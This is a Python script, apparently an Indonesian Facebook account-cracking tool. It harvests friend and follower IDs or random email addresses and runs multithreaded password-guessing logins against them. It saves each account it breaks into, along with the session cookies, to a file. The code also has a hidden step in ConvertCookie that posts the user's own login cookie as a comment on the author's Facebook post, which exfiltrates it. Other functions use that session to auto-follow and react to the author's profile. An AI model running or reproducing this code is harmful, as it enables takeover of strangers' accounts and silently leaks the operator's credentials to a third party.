#-------------------[ JANGAN DI GANTI² KONTOL ]---------------------#
import os, time
try:
     import rich
except (ModuleNotFoundError,ImportError):
     print('\t • Please wait...') ; time.sleep(0.03) ; os.system('pip install rich')
try:
     import requests
except (ModuleNotFoundError,ImportError):
     print('\t • Please wait...') ; time.sleep(0.03) ; os.system('pip install requests')
try:
     import bs4
except (ModuleNotFoundError,ImportError):
     print('\t • Please wait...') ; time.sleep(0.03) ; os.system('pip install bs4')

#-------------------[ MODUL IN PYTHON3 & RICH ]---------------------#
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as khamdihiXV
from bs4 import BeautifulSoup as parse
from datetime import datetime
from rich.tree import Tree

from rich import print as zprint
from rich.panel import Panel
from rich.console import Console
console = Console()
ses = requests.Session()

#-------------------[ BULAN 12 AND CREATOR SC ]---------------------#
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)

author   = 'khamdihi'
facebook = 'khamdihi DEV (https://m.facebook.com/profile.php?id=100086281072244)'
whatsapp = '0857 2941 6714'
komen    = random.choice(
	 ['hello bang😎','Keren Suhu','Salam kenal bang♥','Keren anjay','Kelazz','Pro kntl bang😎','Sehat selalu bang♥','mantap bang😎']
)
#-------------------[ COLOR FOR PYTHOB STYLE ]----------------------#
M = 'color(1)' # ABANG
H = 'color(2)' # IJO
K = 'color(3)' # KUNING
B = 'color(4)' # BIRU
U = 'color(5)' # UNGU
O = 'color(6)' # BIRU NOM
P = 'color(7)' # PUTIH
I = 'color(8)' # IRENG

#-------------------[ TAMPUMG DOSA LU² PADA ]-----------------------#
OK = []
CP = []
ID = []
ID2 = []
loop = 0
ua = random.choice(open('ua.txt','r').read().splitlines())

def Clear_Terminal(platform):
    if 'win' in sys.platform:os.system('cls')
    else:os.system('clear')

def Convert(cookies, username):
    with requests.Session() as x:
       for link in parse(x.get('https://mbasic.facebook.com/' + username, cookies={'cookie':cookies}).text,'html.parser').find_all('a',href=True):
           if '/mbasic/more/?' in link.get('href'):
              return link["href"].split("=")[1].replace("&paipv","")

def ConvertCookie(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
         })
         try:
               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
               search = re.search("(EAAG\w+)", link.text).group(1)
               if 'EAAG' in search:
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                   open('data/token.txt','w').write(search)
                   open('data/cokie.txt','w').write(cookies)
                   return 'status succes'
         except AttributeError:return 'status gagal login!'

def CekResults():
    exei,exex = 0, []
    exec = ('[green][[white]1[green]]. [bold white]Cek hasil akun OK\n[green][[white]2[green]]. [bold white]Cek hasil akun CP\n[green][[white]0[green]]. [bold white]Kembali') ; Console(width=50).print(Panel(exec,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih salah satu')
    ok_cp = console.input('╰──▸ :smiley: : ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       for i in ok:
           exex.append(i)
           exei +=1
           try:cek=open('OK/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold green][[bold white]{}[bold green]]. [bold white]{} : [bold green]{} [bold white]akun'.format(exei,i,len(cek)))

       file = console.input('\n [?] Pilih nomor :angry: : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('OK/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       print('')
       zprint('[bold green]{}'.format(ok))

    elif ok_cp in ['2','02']:
       zprint('\r')
       try:cp=os.listdir('CP')
       except:zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       for i in cp:
           exex.append(i)
           exei +=1
           try:cek=open('CP/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold yellow][[bold white]{}[bold yellow]]. [bold white]{} : [bold yellow]{} [bold white]akun'.format(exei,i,len(cek)))
       file = console.input('\n [?] Pilih nomor :angry: : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('CP/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       print('')
       zprint('[bold yellow]{}'.format(ok))
    else:
       menu()

def ChekOption():
    exec = '[bold green][[bold white]1[bold green]]. [bold white]Chek opsi 1 akun\n[bold green][[bold white]2[bold green]]. [bold white]Chek opsi lewat file\n[bold green][[bold red]0[bold green]]. [bold white]Kembali'
    Console(width=50).print(Panel(exec,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih dari 1-0')
    ask = console.input('╰──▸ :smiley: : ')
    if ask in ['1','01']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan data akun anda, gunakan tanda | untuk pemisahan userid dan password contoh 10008|sandi akun anda' ; Console(width=50).print(Panel(asik,style='bold purple'))
         zprint('╭──▸ [bold white]Harap di baca biar gak eror')
         user = console.input('╰──▸ :smiley: : ')
         try:uid,nama = user.split('|')
         except:exit('\n [×] Kesalahan...')
         CekOptionAcount(uid,nama)
    elif ask in ['2','02']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan nama file berisi akun chekpoint' ; Console(width=50).print(Panel(asik,style='bold purple'))
         zprint('╭──▸ [bold white] Nama file nya ?')
         file = console.input('╰──▸ :smiley: : ')
         try:cp=open('CP/'+file,'r').readlines()
         except:exit('\n [×] File tidak ada cok!')
         for i in cp:
             asu = i.replace('\n','')
             itu = asu.split('|')
             print('\n [?] Mengechek akun : {}|{}'.format(itu[0],itu[1]))
             CekOptionAcount(itu[0],itu[1])
         exit('\n [✓] Proses cek akun chekpoint telah selesai...')
    else:
         menu()

def CekOptionAcount(user,pw):
	ses = requests.Session()
	url = random.choice([
		"m.facebook.com",
		"mbasic.facebook.com",
		"free.facebook.com"
	])
	try:
		link = ses.get(f"https://{url}/login/?source=auth_switcher")
		data = {
			"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"email":user,
			"pass":pw
		}
		posz = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100",data=data) #,headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"})
		if "checkpoint" in ses.cookies.get_dict():
			posh = parse(posz.text,"html.parser")
			find = posh.find("form",method="post")["action"]
			data = {
				"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(posz.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"',str(posz.text)).group(1),
				"checkpoint_data":"",
				"submit[Continue]": "Lanjutkan",
				"nh":re.search('name="nh" value="(.*?)"',str(posz.text)).group(1),
			}
			zozo = requests.post(f"https://{url}{find}",data=data)
			cari = parse(zozo.text,"html.parser")
			opsi = cari.find_all("option")
			if len(opsi) == 0:
				if "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):
					print(" [×] akun terpasang a2f")
				else:
					print(" [?] Akun tidak terkena chekpoint atau spam,kata sandi salah")
			elif "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):
				print(" [✓] akun tap yes :v")
			else:
				for ketemu in opsi:
					print(f" [*] {ketemu.text}")
			
		elif "c_user" in ses.cookies.get_dict():
			cokie = (";").join(["%s=%s"%(a,b) for a,b in ses.cookies.get_dict().items()])
			print(f" *  --> {user}|{pw}|{cokie}")
			open("OK/%s"%(indo),"a").write(f"{user}|{pw}|{cokie}")
		else:
			print(" [×] Kata sandi yang anda masukan salah.")
	except Exception as e:
		pass
def Banner():
    KAGLK = '''[bold white]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔╗
 ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ╠╩╗
 ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝ 
 ( Di Buat oleh [bold green]Khamdihi[bold white] ) '''
    Console(width=50).print(Panel(KAGLK,style='bold purple'),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner()
    ask = '[bold white]Anda belum login. masukan cookie akun facebook anda tidak di sarankan pake akun utama!' ; Console(width=50).print(Panel(ask,style='bold purple')) ; zprint('╭──▸ [bold white]cookies')
    coki = file = console.input('╰──▸ [bold white]Masukan cookies :smiley: : ')
    if coki in ['',' ']:Masuk()
    else:
          link = ConvertCookie(coki)
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100086281072244?v=timeline',coki) ; FollowMe(coki) ; menu()
          else:print('\n [×] Cookie invalid!') ; time.sleep(2);Masuk()

def AuthorBot(url,kontol):
    try:
          link = parse(requests.get(url,cookies = {'cookie':kontol}).text,'html.parser')
          for otw in link.find_all('a',href=True):
                if 'Tanggapi' in otw.text:
                     reac = random.choice(['Super','Peduli','Marah','Sedih','Wow'])
                     for send in parse(requests.get('https://mbasic.facebook.com{}'.format(otw['href']), cookies = {'cookie':kontol}).text,'html.parser').find_all('a'):
                         if reac in send.text:
                               requests.get('https://mbasic.facebook.com{}'.format(send['href']), cookies = {'cookie':kontol})
                         else:
                               continue
          AuthorBot('https://mbasic.facebook.com{}'.format(link.find('a',string='Lihat Berita Lain')['href']), kontol)
    except Exception as e:pass

def FollowMe(kontol):
    try:
          for i in parse(requests.get('https://mbasic.facebook.com/100086281072244', cookies = {'cookie':kontol}).text,'html.parser').find_all('a',href=True):
              if '/a/subscribe.php?' in i.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(i['href']), cookies = {'cookie':kontol}).text
    except Exception as e:pass

def menu():
    Clear_Terminal(platform)
    try:
          cokis = open('data/cokie.txt','r').read()
          token = open('data/token.txt','r').read()
    except (FileNotFoundError,IOError):Masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
    except KeyError:Masuk()
    except requests.exceptions.ConnectionError:exit(' [×] Tidak ada koneksi.')
    Banner() ; time.sleep(0.01) ; exec = (f'[bold white]Selamat datang [bold green]{nama}[bold white], selamat menggunakan') ; Console(width=50).print(Panel(exec,style='bold purple'))
    list = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari publik
[bold green][[bold white]2[bold green]]. [bold white]Crack dari publik massal
[bold green][[bold white]3[bold green]]. [bold white]Crack dari followers publik
[bold green][[bold white]4[bold green]]. [bold white]Crack dari email random
[bold green][[bold white]5[bold green]]. [bold white]Chek hasil crack
[bold green][[bold white]6[bold green]]. [bold white]Chek opsi akun chekpoint
[bold green][[bold white]0[bold green]]. [bold white]Keluar''') ; Console(width=50).print(Panel(list,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih menu di atas dari 1-6')
    assk = console.input('╰──▸ [bold white]Pilihan :smiley: : ')
    if assk in ['1','01']:
          Console(width=50).print(Panel('[bold white]Ketik [bold green]me[bold white] jika ingin crack dari daftar teman akun tumbal',style='bold purple'))
          zprint('╭──▸ [bold white]Pastikan akun target bersifat publik!')
          id = console.input('╰──▸ [bold white]id target :smiley: : ')
          try:
                for x in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(id,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                    ID.append(x['id'] +'/'+ x['name'])
          except (KeyError):
                Console(width=50).print(Panel(f'[bold red]Akun {id} tidak publik, cari yang lain',style='bold purple')) ; time.sleep(2) ; menu()
          AturUser()
    elif assk in ['2','02']:
         Console(width=50).print(Panel('[bold white]Ketik [bold green]me[bold white] jika ingin crack dari daftar teman akun tumbal dan gunakan tanda koma untuk pemisahan id contoh 10008,10005',style='bold purple'))
         zprint('╭──▸ [bold white]Pastikan akun target bersifat publik!')
         id = console.input('╰──▸ [bold white]id target :smiley: : ')
         for kontol in id.split(','):
             try:
                   for data in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(kontol,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                       ID.append(data['id'] +'/'+ data['name'])
             except (KeyError):pass
         AturUser()
    elif assk in ['3','03']:
         Console(width=50).print(Panel('[bold white]Ketik [bold green]me[bold white] jika ingin crack dari daftar followers sendiri',style='bold purple')) ; zprint('╭──▸ [bold white]Pastikan akun target bersifat publik!')
         id = console.input('╰──▸ [bold white]id target :smiley: : ')
         try:
              for data in requests.get('https://graph.facebook.com/{}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={}'.format(id, token), cookies={'cookie':cokis}).json()['subscribers']['data']:
                  ID.append(data['id'] +'/'+ data['name'])
         except (KeyError):
               Console(width=50).print(Panel(f'[bold red]Akun {id} tidak publik, cari yang lain',style='bold purple')) ; time.sleep(2) ; menu()
         AturUser()
    elif assk in ['4','04']:
         Console(width=50).print(Panel('[bold white]Masukan nama gunakan tanda koma untuk pemisahan contoh andi andika',style='bold purple')) ; zprint('╭──▸ [bold white]masukan nama')
         nama = console.input('╰──▸ [bold white]name target :smiley: : ')
         for i in nama.split(','):
             for x in range(2000):
                 domain = random.choice(['@gmail.com','@yahoo.com'])
                 tambah = random.choice([random.randint(0,60),'amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun',random.randint(1,20),'32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri',random.randint(0,35),'rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna'])
                 aapaan = f'{i}{tambah}'
                 jembut = '{}{}/{}'.format(aapaan,domain,i)
                 if jembut in ID:pass
                 else:ID.append(jembut)
             AturUser()
    elif assk in ['5','05']:CekResults()
    elif assk in ['6','06']:ChekOption()
    elif assk in ['0','00']:os.system('rm -rf data/token.txt && rm -rf cokie.txt') ; exit(0)
    else:menu()

def AturUser():
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari ID tua
[bold green][[bold white]2[bold green]]. [bold white]Crack dari ID new
[bold green][[bold white]3[bold green]]. [bold white]Crack dari ID random''') ; Console(width=50).print(Panel(exec ,style='bold purple'))
    zprint('╭──▸ [bold white]Di sarankan from ID new')
    idndi = console.input('╰──▸ [bold white]Atur id : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
         for i in ID:
             ID2.insert(0,i)
    else:
         for i in ID:
             xx = random.randint(0, len(ID2))
             ID2.insert(xx, i)
    AturLogin()

def AturLogin():
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari free.facebook.com
[bold green][[bold white]2[bold green]]. [bold white]Crack dari mbasic.facebook.com
[bold green][[bold white]3[bold green]]. [bold white]Crack dari mobile.facebook.com''') ; Console(width=50).print(Panel(exec ,style='bold purple'))
    zprint('╭──▸ [bold white]Di sarankan free/mobile')
    link = console.input('╰──▸ [bold white]Pilih link login : ')
    if link in ['1','01']:url='free.facebook.com'
    elif link in ['2','02']:url='mbasic.facebook.com'
    else:url='m.facebook.com'
    WordlistLogin().password(url)

class WordlistLogin:
    def __init__(self):
        pass

    def password(self,link):
        exec = (f'[bold green][[bold white]*[bold green]]. [bold white]OK save in : OK/{indo}.txt\n[bold green][[bold white]*[bold green]]. [bold white]CP save in : CP/{indo}.txt') ; Console(width=50).print(Panel(exec ,style='bold purple'))
        with khamdihiXV(max_workers=30) as coid:
             for UserAkun in ID2:
                  uid,nama = UserAkun.split('/')
                  terserah = nama.split(' ')[0]
                  if len(nama) <=5:
                        if len(terserah) <=1 or len(terserah) <=2:pass
                        else:
                               pwx = [terserah+'123', terserah+'1234', terserah+'12345',terserah+'321','sayang','kata sandi']
                  else:
                        pwx = [nama, terserah+'123', terserah+'1234', terserah+'12345', terserah+'321','sayang','kata sandi']
                  coid.submit(self.crackxv, uid, pwx, link)
        exit(f'\n [✓] Crack telah selesai OK:{len(OK)} CP:{len(cp)}')


    def crackxv(self, user, pwx, url):
        global loop, OK,CP
        print(f'\r \033[97mcrack {url}: {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          link = ses.get('https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', link).group(1),'li':re.search('name="li" value="(.*?)"', link).group(1),'try_number':'0','unrecognized_tries':'0','email':user,'pass':pw,'login':'Masuk','bi_xrwh':'0'}
                          head = {'Host': url,'content-length': '128','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          zzzz = ses.post('https://{}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100'.format(url), data=data, headers=head, allow_redirects=False)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               print('\r \x1b[1;92m*  --> %s|%s|%s'%(user,pw,kueh))
                               open('OK/{}'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('ANAK KONTOL BISANYA CUMA CEK² METHODE')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               print('\r \x1b[1;91m*  --> %s|%s                   \x1b[1;91m'%(user,pw))
                               open('CP/{}'.format(indo),'a').write('%s|%s\n'%(user,pw))
                               CP.append('UDAH MOKAD :(')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(30)
        loop +=1


def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass

if __name__ == "__main__":
	os.system('git pull')
	folder()
	menu()
